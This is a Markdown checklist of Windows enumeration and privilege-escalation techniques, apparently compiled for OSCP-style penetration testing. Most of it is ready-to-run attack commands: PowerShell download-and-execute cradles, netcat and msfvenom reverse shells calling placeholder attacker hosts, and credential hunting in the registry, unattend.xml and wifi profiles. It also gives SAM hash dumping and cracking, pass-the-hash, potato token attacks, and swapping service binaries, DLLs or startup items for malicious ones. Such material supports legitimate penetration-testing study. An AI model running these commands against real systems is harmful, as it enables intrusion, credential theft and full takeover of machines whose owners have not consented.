# Windows Survey and Privilege Escalation

This checklist includes basic enumeration techniques using native commands and Powershell cmdlets, common enumeration tools, and techniques used to escalate priveleges on windows machines.  This is a compialation from multiple courses, books, and other checklists that are referenced at the bottom and throughtout this checklist.

Of note: 
* wmic = Windows Managmenet Instrumentatiom Commandline
* sc = Service Controller
* *Get* and *Invoke* commmands are powershell cmdlets

<br/>

## Automated Enumeration Tools

The below tools can be used to automate the survey ad prviliege escalation process.  Reference the source documentation for usage of each tool.  If you plan to use these, run as many as you can as each each one offers different outputs and recommendations that others do not:

#### Bat scripts and Executables

* [winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
  * To help spot misconfigurations (highlighted in red) add a registry key to enable colors in the command prompt before running winPEAS: 
       ```c
       reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
       ```
* [Seatbelt](https://github.com/GhostPack/Seatbelt)
* [SharpUp](https://github.com/GhostPack/SharpUp)

#### Powershell Scripts

Before exeuting these scripts, ensure to enable the use powershell scripts with *powershell -ep bypass* from cmd or *Set-ExecutionPolicy Bypass -Scope Process* in PowerShell

* [Sherlock](https://github.com/rasta-mouse/Sherlock)
* [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
    * How to start PowerUp.ps1 from the command prompt:
        ```c
        powershell -exec bypass
        . .\PowerUp.ps1
        Invoke-AllChecks
        ```
* [JAWS](https://github.com/411Hall/JAWS)
* [WinEnum](https://github.com/EnginDemirbilek/WinEnum)

#### Vulnerability Scanners and Exploit Suggesters

* [Watson](https://github.com/rasta-mouse/Watson) (Windows 10)
* [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
    * Initial setup and usage:      
        
        ```c
        # first need to download the exploit database:
        python wes.py --update
        
        # regular use 
        python wes.py <SYSTEMINFO_FILE>

        # these options will check only for privesc exploits where an exploit is available
        python wes.py <SYSTEMINFO_FILE> -i "Elevation of Privilege" --exploits-only

        # look for "Impact: Elevation of Privilege"
        ```
* [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

        ```c
        run post/multi/recon/local_exploit_suggester
        ```
#### Microsoft Sysinternals        

While not an automated enumeration tool, [Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) is a suite of tools meant for trouleshooting Windows systems but are also very useful for identifing vulnerabilites.   These tools include accesschk, icacls, and psexec.  

<br/>

## Transferring Files

Webserver method (Linux > Windows):
```
# start a webserver on kali using python
python -m SimpleHTTPServer 80
python3 -m http.server 80

# grab file from the webserver to windows in cmd
certutil -urlcache -f http://<IP_ADDR>/<FILE> <OUTPUT_FILE>
powershell -c Invoke-WebRequest "http://<IP_ADDR>/<FILE>" -OutFile "<OUTPUT_FILE>"
powershell "IEX(New-Object Net.WebClient).downloadString('http://<IP_ADDR>/<FILE>')"

# download while in powerhsell
Invoke-WebRequest "http://<IP_ADDR>/<FILE>" -OutFile "<OUTPUT_FILE>"

# download and execute using powershell from cmd
echo IEX(New-Object Net.WebClient).DownloadString('http://<IP_ADDR>/<FILE>') | powershell -noprofile - 
```

FTP Server Method:
```
# install the python module
pip3 install pyftpdlib

# start up the ftp server
python3 -m pyftpdlib -p 21 --write

# connect to the FTP server from windows
ftp <IP_ADDR>
USER anonymous
PASSWORD <BLANK>

# (Linux > Windows)
get <FILE> 

# (Windows > Linux)
put <FILE>
```

SMB method:
```
# enable smb on the target windows machine (may only work with admin privileges and will need to reboot)
PS> Get-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol 
PS> Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All

# start up smbserver on linux 
python3 /usr/share/doc/python3-impacket/examples/smbserver.py <SHARE_NAME> <DIRECTORY_TO_SHARE>

# on windows copy the files needed FROM the smb server:
copy \\<IP_ADDR>\<SHARE_NAME>\<FILE> <DESTINATION>

# on windows copy the files needed TO the smb server:
copy <PATH_TO_FILE> \\<IP_ADDR>\<SHARE_NAME>\
```
<br/>

## Survey Commands

### System Information (Hardware/Software)
```
systeminfo
ver 
hostname

# only OS information 
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

# verbose hotfix (patch) info 
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
List the disk drives:
```
wmic logicaldisk get caption,description,providername 
```

<br/>

### Users and Groups

View the current user's information:
```
# username
whoami
echo %username%
$env:UserName

# user details
whoami /all
net user <USERNAME>

# user privilages (looking for SeImperonsatePrivilege/SeAssignPrimaryToken or SeChangeNotifyPrivilege for token impersonation)
whoami /priv
```
<br/>

Enviornment variables:
```
set
Get-ChildItem Env: | ft Key,Value
```
Enumerate users and groups: 
```
# who else is logged in 
qwinsta

# local users
net user
net user <USERNAME>
Get-LocalUser

# domain users 
net user /domain 
net user <USERNAME> /domain

#search through user directories
tree /f /a C:\Users\<USERNAME>
Get-ChildItem C:\Users\<USERNAME> -Force

# search for files with alternate data streams (hidden data indicated by $DATA):
dir /R C:\Users\<USERNAME>
more <FILE_WITH_HIDDEN_DATA>

# local groups 
net localgroup
Get-LocalGroups

# view users in a group
net localgroup <GROUP>
Get-LocalGroupMember <GROUP>

# domain groups 
net groups
net groups /domain
```

*Continue on page 627 of PWK

<br/>

### Networking:

Networking configuration:
```
ipconfig
ipconfig /all
route print
arp -a
type C:\windows\system32\drivers\etc\networks
```
Display active TCP/UDP connections:
```
netstat -ano

# connections with executeable 
netstat -bano
```
Conntections Explained (reference: https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
* Local address 0.0.0.0 means that the service is listening on all interfaces. This means that it can receive a connection from the network card and anyone can connect to it (should have shown up in the nmap scan)
* Local address 127.0.0.1 means that the service is only listening for connections from the PC itself, not from the internet or anywhere else (will not show up in a external nmap scan)
* A private IP address means that the service is only listening for connections from the local network. So someone in the local network can connect to it, but not someone from the internet (will not show up in a external nmap scan)

Port Forwarding - Use to access a service that is only accessible from the target Windows machine.  Setup port forwarding using [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) (ensure to download the latest version!):
```
plink.exe -l <ATTACKER_USERNAME> -pw <ATTACKER_PASSOWRD> -R <ATTACKER_PORT>:127.0.0.1:<VICTIM_PORT> <ATTACKER_IP>

# the attacker port should provide access to the service on the attacker machine
```

Firewall/Anti-Virus:
```
# windows defender
sc query windefend

# firewall (old)
netsh firewall show state
netsh firewall  show config

# firewall (new)
netsh advfirewall show allprofiles
netsh advfirewall show global
```

<br/>

### Password Hunting:

Look for stored credentials:
```
cmdkey /list
```
If there are stored credential for a user with adminstrative privileges, use runas to execute commands such as executing a netcat reverse shell:
```
runas /savecred /user:<HOSTNAME>\<USER> "<IP_ADDRESS> <PORT> -e cmd.exe"
```
Find the string *password* in certain types of files: 
```
# search current directory
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
findstr /si password *.config

# same as above but with dir
dir /s password == *.config
```
The Windows answer file (unattend.xml) contains setting definitions and values to use during Windows Setup (including passwords!):
```
# search for the answer file
where /R C:\ Unattend.xml

# scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.
# base64 decode
echo <copied base64> | base64 -d

```
Wifi passwords:
```
netsh wlan show profile
netsh wlan show profile <SSID> key=clear | findstr "Key Content"
```

Registry:
```
# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s

# looking for the following entries
ProxyUsername
ProxyPassword

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Search the keys and values that contain "password":
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

Windows stores password hashes in the Security Account Manager (SAM).  The hashes in this are encrypted with a key which can be found in a file named SYSTEM:
```
# this is usually locked while windows is running 
dir C:\Windows\System32\config

# check for backups of the SAM and SYSTEM file
dir C:\Windows\Repair
dir C:\Windows\System32\config\RegBack
```
If you can obtain the SYSTEM and SAM files, use [pwdump](https://gitlab.com/kalilinux/packages/creddump7) to dump the hashes then crack the LM hash (left part) with hashcat:
```
# dump hashes
python pwdump.py <system hive> <SAM hive>

# crack hashes
hashcat -m 1000 --force <HASH> <WORDLIST>
```
Pass the Hash - Using hashed credentials found to execute a command against the remote windows system:
```
pth-winexe -U '<username%LM_HASH:NTML_HASH>' //<IP_ADDRESS> <COMMAND>
pth-winexe -U '<username%LM_HASH:NTML_HASH>' --system //<IP_ADDRESS> <COMMAND>
```
Use credentials found to execute a command against the remote windows system:
```
# regular user (port 445)
winexe -U '<USERNAME%PASSWORD>' //<IP_ADDRESS> <COMMAND>

# system shell
winexe -U '<USERNAME%PASSWORD>' --system //<IP_ADDRESS> <COMMAND>

# example
winexe -U 'admin%password123' //192.168.1.10 cmd.exe
```

*To-Do: GPP Passwords - refernce HTB Active 

<br/>

### Processes and Services

Running proceeses:
```
wmic process list brief
sc queryex type= service 
sc queryex type= service  | finstr "SERVICE NAME"
```
Running services:
```
net start
```
Running programs
```
tasklist
```
Can also use WinPEAS or Seatbelt to identify non-standard programs and the full path to the executeable:
```
.\seatbelt.exe NonstandardProcesses
.\winPeas.exe quiet procesinfo 
```
Use exploitdb to search for local windows privesc exploits againts these programs

### Scheduled Tasks

List all the shcheduled tasks you can see
```
schtasks /query /fo LIST /v

Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
<br/>


## Priviliege Escalation Techniques

This section includes identifying and exploiting common vulnerabilites in Windows to gain adminstrative privlieges

<br/>

### Windows Subsytem for Linux (WSL)

Reference - https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---windows-subsystem-for-linux-wsl

Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port or reverse shells (no elevation needed).

First locate wsl:
```
where /R C:\Windows bash.exe 
where /R C:\Windows wsl.exe 
```
Determine if the bash/wsl is run as root:
```
wsl.exe whoami 
```
Open a bash terminal using the subsytem:
```
bash.exe 
wsl.exe

# spawn a tty shell 
python -c 'import pty; pty.spawn("/bin/bash")'
```

Perform standard linux enumeration:
```
pwd 
id 
history
etc...
```
<br/>

### Hot Potato

[Hot Potato](https://foxglovesecurity.com/2016/01/16/hot-potato/) uses a spoofing attack along with an NTLM relay attack to gain SYSTEM privileges. The attack tricks Windows into authenticating as the SYSTEM user to a fake HTTP server using NTLM. The NTLM credentials then get relayed to SMB in order to gain command execution. This attack works on Windows 7, 8, early versions of Windows 10, and their server counterparts:
```
.\potato.exe -ip <ATTACKER_IP> -cmd "<REVERSE_SHELL_EXE>" -enable_httpserver true -enable_defender true -enable_spoof true -enable_exhaust true
```

<br/>

### Token Impersonstion (Payloadallthethings)

References
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges
* https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt

Tokens are temporary keys that give you access to a system/network without having to provide credentials each time you access a file (think of these as cookies for a computer)

Types of tokens:
* Primary Access Token – Created when the user logs in, bound to the current user session. When a user starts a new process, their primary access token is copied and attached to the new process.
* Impersonation Access Token – Created when a process or thread needs to temporarily run with the security context of another user.

Service accounts can be given special privileges in order for them to run their services, and cannot be logged into directly. Service accounts are generally configured with SeImpersonate / SeAssignPrimaryToken privileges.  More about these privileges:
* SeImpersonatePrivilege grants the ability to impersonate any access tokens which it can obtain.  If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token (Juicy Potato)
* SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege.  It enables a user to assign an access token to a new process (Juicy Potato)

First, check your current privileges:
```
whoami /priv
```
If you see `SeImpersonatePrivilege` or `SeAssignPrimaryPrivilege` are enabled, you can proceed with a token impersonation attack.  You can also run window-exploit-suggester and see if there are any vulnerabilites to potato attacks.

#### Exploitation Method 1: Metasploit Token Impersonation (Potato Attack)
 

First you must have a meterpreter shell on the target machine, then verify your privileges:
```
meterpreter > getprivs
```
Now see if the machine is vulnerable to any of the built in potato attacks:
```
meterpreter > run post/multi/recon/local_exploit_suggester

# should see one of these in the output:
[+] exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable
[+] exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
```
Background the current meterpreter sessions and setup for the potato attack:
```
meterpreter > background

# specify the exploit
use exploit/windows/local/ms16_075_reflection

# choose payload
set payload windows/x64/meterpreter/reverse_tcp

# final options
set LPORT <PORT>
set LHOST <IP_ADDRESS>
set SESSION <SESSION_#>

run
```

In meterpreter, load incognito mode and see if there is an admin account we can impersonate: 
```
meterpreter > incognito

meterpreter > list tokens -u
```

Look for *Impersonation Tokens Available* and use the account you want to impersonate:
```
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
```
Now you should have a session with system privilegs

#### Exploitation Method 2: Tater.ps1

Reference - https://github.com/Kevin-Robertson/Tater

First start up powershell: 
```
powershell.exe -nop -ep bypass
```
For this example, import Tater.ps1 and use it to add a user that you already have access to to the adminstrators group:
```
Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1

# add user to the admin group
Invoke-Tater -Trigger 1 -Command "net localgroup administrators <USER> /add"
```
Confirm that the user was added to the right group:
```
net localgroup administrators
```
#### Exploitation Method 3: Juicy Potato

Reference - https://0xrick.github.io/hack-the-box/conceal/

Download the juicy potato [executable](https://github.com/ohpe/juicy-potato/releases) and move it to the target machine.  You will also need to have netcat on the target machine to get the reverse shell.

Create a .bat reverse shell on the target machine:
```
echo nc.exe -e cmd.exe <IP_ADDRESS> <PORT> > rev.bat
```
We need to know the version of this windows to pick the right CLSID.  Ensure to run *systeminfo* to get this.  Now check for the corresponding CLSID [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID) or [here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md).  You can also try to run the [GetCLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) powershell script to extract CLSIDs from the system: 
```
.\GetCLISD.ps1
```
With all of that we can execute the reverse shell (ensure listener is up on the attacker machine):
```
JuicyPotato.exe -p rev.bat -l <PORT> -t * -c <CLSID>

# the PORT must be availble on the target machine
```
*You can replace the bat script with a reverse shell executeable

#### Exploitation Method 4: Rogue Potato

[Rogue Pototo](https://github.com/antonioCoco/RoguePotato) is the latest version of potato exploits since juicy potato has been patched for newer version of Windows 10

To use this, setup your kali machine as a redirector to send traffic from port 135 over to port 9999 on the target windows machine (ensure that port 9999 is available):
```
socat tcp-listen:135,reuseaddr,fork tcp:<WINDOWS_IP>:9999
```
Use [RoguePotato.exe](https://github.com/antonioCoco/RoguePotato/releases) to execute a reverse shell or cmd./exe: 
```
RoguePotato.exe -r <ATTACKER_IP> 9999 -e "REVERSE_SHELL_EXE"
RoguePotato.exe -r <ATTACKER_IP> 9999 -e "C:\Windows\System32\cmd.exe"

# with CLSID (use same methods to obatin these as juicy potato)
RoguePotato.exe -r <ATTACKER_IP> 9999 -e "REVERSE_SHELL_EXE" -c "<CLSID>"
```

### PrintSpoofer

References:
* https://github.com/itm4n/PrintSpoofer
* https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/

PrintSpoofer is an exploit that targets the Print Spooler service.
```
PrintSpoofer.exe –i -c "<REVERSE_SHELL_EXE>"
```

<br/>

### getsystem

reference: https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/

`getsystem` uses Meterpreter to elevate you from a local administrator to the SYSTEM user using named pipe inpersonation or token duplication.

Concepts used by getsystem:
* Named Pipes - A process can create a named pipe, and other processes can open the named pipe to read or write data from/to it. The process which created the named pipe can impersonate the security context of a process which connects to its named pipe.  getsystem uses two tipes of named pipe impersonation:
    * In memory - getsystem creates a named pipe controlled by Meterpreter and a service (running as SYSTEM) which runs a command that interacts directly with the named pipe.  Meterpreter then impersonates the connected process to get an impersonation access token (with the SYSTEM security context).  The access token is then assigned to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges.
    * On disk - Only difference is a DLL is written to disk, and a service is created which runs the DLL as SYSTEM.  The DLL then connects to the named pipe.
* Token Dulication - Windows allows processes/threads to duplicate their access tokens. An impersonation access token can be duplicated into a primary access token this way.  If we can inject into a process, we can use this functionality to duplicate the access token of the process, and spawn a separate process with the same privileges.  To use this technique with getsystem, you will need the `SeDebugPrivilege`.   It then finds a service running as SYSTEM which it injects a DLL into.  The DLL duplicates the access token of the service and assigns it to Meterpreter (currently only works on x86 architectures).  This is the only technique that does not have to create a service and operates entireley in memory using dll injection. 

Usage:
```
meterpreter > getsystem
```

<br /> 

### Autoruns Escalation

Reference - https://tryhackme.com/room/windowsprivescarena; https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries

Looking for executables that are autmomatically run by the system and and if we have permission to change those executeables.  These are automatically run using the registry, task scheduler, or the startup directory.

#### Identification Method 1: Maunal Method 

Use WMIC or the registry to ID autorun programs:
```
wmic startup
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

#### Identification Method 2: Accesschk GUI

Check the system for Autoruns executable:
```
where /R C:\ Autoruns*
```
With an RDP session, open Up Autoruns and look for executables that are automatically started up:
```
<PATH_TO_AUTORUNS>\Autoruns(64).exe>
```

#### Identification Method 3: Enumeration Scripts

Use PowerUp to identify modifiable registry autoruns and configs:
```
powershell -ep bypass
.\PowerUp.ps1
Invoke-AllChecks

[*] Checking for modifiable registry autoruns and configs
```
Use winPEAS to identify modifiable registry autoruns and configs:
```
.\winPEAS

[+] Autorun Applications
```

#### Exploitation

Use [accesschk](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) to see who has write abilities to the files in the directory where the executatle is located (note that the newer version(64) of accesschk will spwan an "accept EULA" popup window that must be accepted for it to work, which needd RDP):
```
accesschk.exe /accepteula -wvu <DIRECTORY>
accesschk64.exe -wvu "<DIRECTORY>"

# Looking for 
RW Everyone
      FILE_ALL_ACCESS
```
Create a reverse shell that will impersonate the executable
```
msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<ATTACKER_PORT> -f exe -o <NAME_OF_FILE_TO_IMPERSONATE>
```
Now move this file onto target and replace the good executable with your malicious executable.  Once the autorun conditions are met (login, etc.) your malicous executable will kick off.

<br/>

## AlwaysInstallElevated 

Windows may be configured to to install MSI packages with elevated privileges (administrator user).  First check to see if this is already enabled ( “AlwaysInstallElevated” value is set to 1 for both local machine and current user)
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

# command output
AlwaysInstallElevated  REG_DWORD  0x1
```
#### Exploitation Method 1: PowerUP

Identification and exploitation with PowerUP:
```
powershell -ep bypass
.\PowerUp.ps1
Invoke-AllChecks

# Now look for this output in the survey:
{*} Checking for AlwaysInstallElevated registry key...
```
If it came back with a yes, create a malicous msi package with PowerUp:
```
Write-UserAddMSI
```
Now run the malicious MSI and create a new user with administrative privileges.  Now you can login with the new user!

#### Method 2: msfvenom

Identification with winPEAS:
```
.\winPEAS

[+] Checking AlwaysInstallElevated
```
Create a malicous msi with msfvenom:
```
msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<ATTACKER_PORT> -f msi -o setup.msi
```
Transfer the file over to the target machine and run it to catch a reverse shell (ensure your listener is up):
```
msiexec /quiet /qn /i <REVERSE_SHELL_MSI>
```

#### Exploitation Method 3: Metasploit

Use a metasploit windows post exploitation script to elevate priviliges if you have a meterpreter shell on the target machine:
```
use exploit/windows/local/always_install_elevated
set session <SESSION_#>
run
```

<br/>

### Services Escalation - regsvc ACL

See if we have full control of a registry service (regsvc) by checking the ACL for it:
```
powershell -ep bypass
Get-Acl -Path HKLM\System\CurrentControlSet\services\regsvc | fl

# looking for output with "FullControl"
```
Can also use accesschk:
```
accesschk.exe /accepteula -kvuqsw HKLM\System\CurrentControlSet\services\regsvc 

# Look for RW NT AUTHORITY\INTERACTIVE
                  KEY_ALL_ACCESS
```
Note that the NT AUTHORITY\INTERACTIVE group has full control over the registry key.  This is a sudo group comprised of all users that can log onto the system locally.

You can also use winPEAS and check the output of *Check if you can modify any service registry*

Verify that you can stop and start the service:
```
accesschk.exe /accepteula  -ucqv <USERNAME> regsvc

# looking for SERVICE_START and SERVICE_STOP
```
See what privileges the service is running with:
```
reg query HKLM\System\CurrentControlSet\services\regsvc

# This indicates system privileges
ObjectName REG_SZ LocalSystem
```
If we have control of the service as referenced above, we can add an executable to the service and then stop/start/restart the service.  

Add a malicous executeable (reverse shell) to the *ImagePath* subkey by adding path to the drivers image file: 
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\<MALICIOUS_EXE> /f
```
Now start/restart the service to catch a reverse shell (ensure your listener is up):
```
sc stop regsvc
sc start regsvc
```

<br/>

### Service Escalation - Executable Files (Insecure Service Executables)

Start with PowerUP:
```
powershell -ep bypass
.\PowerUp.ps1
Invoke-AllChecks

# look for this output in the survey:
{*} Checking service executable and argument permissions...
```
Look at the *Modifiable File* and *Path* of the the executable. Can also use winPEAS and look for the output of *Check if you can overwrite some service binary*

You can use accesscheck to verify permissions:
```
accesschk.exe /accepteula -wvuqc "<PATH_TO_EXE>"
accesschk64.exe -wvuqc "<PATH_TO_EXE>"

# Looking for this or your specific group:
RW Everyone
      FILE_ALL_ACCESS
      ...snip...
      SERVICE_START
      SERVICE_STOP
```
Now replace the executeable with a malicious executeable (reverse shell):
```
copy /y c:\Temp\<REVERSE_SHELL_EXE> "c:\Program Files\File Permissions Service\filepermservice.exe"
```
Now start/restart the service which should execute the malicious executable as nt/authority system (ensure your listener is up):
```
sc stop <service>
sc start <service>
```

<br/>

### Startup Applications

Each user can define apps that start when they log in, by placing shortcuts to them in a specific directory.  Windows also has a startup directory for apps that should start for all users:
```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```
If we can create files in this directory, we can use a reverse shell executable and escalate privileges when an administrator  logs in.

Use [icacls](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls) or accesschk to see if you can read/write to the startup directory:
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
# Looking for <F> which means full access

accesschk.exe /accecpteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
# Looking for RW everyone of BUILTIN\Users
```
Now create a reverse shell executeable to be placed in the startup directory:
```
msfvenom -p windows/shell_reverse_tcp lhost=<ATTACKER_IP> lport=<ATTACKER_PORT>-f exe -o <NAME_OF_FILE_TO_IMPERSONATE>
```
Place the file in the startup directory, once the administrator logs in, you will get a reverse shell (ensure listener is up).  

Note that shortcut files (.lnk) may need to be used. The following VBScript can be used to create a shortcut file:
```
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "<PATH_TO_REVERSE_SHELL_EXE>"
oLink.Save
```
Run the above script:
```
cscript CreateShortcut.vbs
```
Now set up listern and wait for admin user to login...


<br/>

### DLL Hijacking

Reference - https://tryhackme.com/room/windowsprivescarena

DLLs are similar to .so files (\*nix) which serve as libraries which run with executables.  Hijacking is looking for an instance where a service is looking for a dll that does not exist and is/should be in a PATH that is writeable.  Use the reference above for how to search for missing DLL's using procmon which will require an RDP session and procmon.

Without an RDP session, we can identify missing DLLs with winPEAS:
```
.\winPEAS.exe

[?]Check write permissions in PATH folders (DLL Hijacking)
```
Windows will search through the PATH folders when looking for dll's associated to services.  If the PATH is writeable and the serviceis missing, we can add a malicous dll to be executed.  You will have to enumerate each service manually using accesschk to see which ones you can stop and start:
```
accesschk.exe /accepteula -uvqc <USERNAME> <SERVICE>
```
For the the service that we can stop and start, locate the binary path and confirm the service runs with system privileges:
```
sc qc <SERVICE>

# check for this output:
BINARY_PATH_NAME: <PATH>
SERVICE_START_NAME: LocalSystem
```
Create a malicious dll:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f dll -o <MISSING_DLL>.dll
```
Place the malicious dll in the PATH where the legitmate dll should be, then restart the service (ensure your listener is up)

<br/>

### Binary Paths

Identify vulnerable biary paths with PowerUp:
```
powershell -ep bypass
.\PowerUp.ps1
Invoke-AllChecks

# now look for this output in the survey:
{*} Checking service permissions...
```
Verify the path to the service's binary: 
```
sc qc <SERVICE>
```
Verify with accesschk (not required but a good sanity check):
```
# show all services where everyone can read/write
accesschk64.exe -qwuvc Everyone *

# details for any service that was found
accesschk64.exe -qwuvc <SERVICE>

# looking for SERVICE_CHANGE_CONFIG” permission for everyone and the SERVICE_STOP and SERVICE_START
```
If we have the SERVICE_CHANGE_CONFIG permission, we can edit the BINARY_PATH_NAME and run a command, such as add a user to the administrators group:
```
sc config <SERVICE> binpath= "net localgroup administrators <USERNAME> /add"

# check it was changed 
sc qc <SERVICE> 

# restart the service so it runs the command
sc stop <SERVICE>
sc start <SERVICE> 

# verify the user has been added to the administrators group
net localgroup administrators
```

<br/>

### Unquoted Service Paths

Occurs when a service's executable path contains a space and is not enclosed in quoations marks. 

Use PowerUp to identify unquoted service paths (can also use winPEAS)
```
powershell -ep bypass
.\PowerUp.ps1
Invoke-AllChecks

# now look for this output in the survey:
{*} Checking for unquoted service...
```
Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes, so we can place a malicious executeable somewhere in the path.

* Example, if the path of the exe is C:\Progam Files\service.exe, place a malicious executeable as C:\Progam.exe (if you have permission to write to that directory)

Use accesschk to see what folders in the path we have read/write access to: 
```
accesschk.exe /accepteula -uwdq "<PATH>"

# looking for a folder with RW for our group or everyone 
```
Perform this until you have a place in the path to drop the malicious executeable.

Generate a malicious executeable that will add a user to the administrator group:
```
msfvenom -p windows/exec CMD='net localgroup administrators <USER> /add' -f exe-service -o program.exe
```
Place the executeable in the path of the legitimate executeable.  Now restart the service which should run the malicous executable (ensure listener is up)
```
# check the configuration of the service
sc qc <SERVICE>

# check the status of the service to see if it needs to be stopped
sc query <SERVICE>

# restart if needed
sc stop <SERVICE>
sc start <SERVICE> 
net stop <SERVICE> 
net start <SERVICE> 

# verify the changes took effect
net localgroup administrators
```

<br/> 

### runas

Look for stored credentials.
```
cmdkey /list
```
Check the full path of runas and use as needed: 
```
where /R C:\ runas.exe
```
If there are stored credentials for a user with adminstrative privileges, use runas to execute commands like kicking off a netcat reverse shell:
```
runas /savecred /user:ACCESS\Administrator "nc.exe <IP_ADDRESS> <PORT> -e cmd.exe"
```
If you have credentials for an administrator, use runas with a provided set of credential to execute a command as that user:
```
runas /env /noprofile /user:<USERNAME> <PASSWORD> "nc.exe <IP_ADDRESS> <PORT> -e cmd.exe"
```
<br/>

### PsExec64

With PSExec, it is possible to become NT Authority\System using the -s and -i flags.  `-s` indicates to run the executable with the System account and `-i` specifies that it interacts with the desktop. 

Use PsExec64 to spawn a reverse shell with system priviliges:
```
.\PsExec64 -acccepteula -i -s <REVERSE_SHELL_EXECUTEABLE>
```
Use PsExec64 to elevate your current session to a system user:
```
.\PsExec64 -s -i cmd.exe 
```

<br/>

### Bloodhound (To-Do)

Also reffered to as walking the dog...
```
#install
sudo apt install bloodhound 

#start bloodhound
bloodhound

#start neo4
neo4j console

#run sharphound on the target windows machine
./Sharphound.exe

#copy the zip file to your attacking machine, drag and drop into neo4j
```
Reference Sauna HTB machine

<br/>

### UAC Bypass 
Refernce -  https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe

<br/>

### Kernel Exploits

Check any enumeration script for potential vulnerabilites to common exploits. Other than exploitdb, this site has many precomplied exploits: https://github.com/SecWiki/windows-kernel-exploits

<br/> 

## Reverse Shells 

Basic executeable:
```
# setup the listener
nc -nlvp <LPORT>

# 32 bit cmd.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe

# 64 bit cmd.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe
```

Meterpreter reverse shell:
```
# setup the listener
msf > user exploit/multi/handler
set PAYLOAD <PAYLOAD_FROM_MSFVENOM> (windows/x64/meterpreter/reverse_tcp)
set LHOST
set LPORT
run

# 32-bit payload generation
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe

# 64-bit payload generation
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<ATTAKCER_PORT> -f exe -o reverse.exe
```

<br/> 

## References 

#### Checklists 
* https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/
* https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters
* https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation

#### Courses
* Udemy Windows Privilege Escalation for Beginners Course
* Udemy Windows Privilege Escalation for OSCP and Beyond! Course

#### Other References
* Hiding data inside of files (Data Streams) - https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
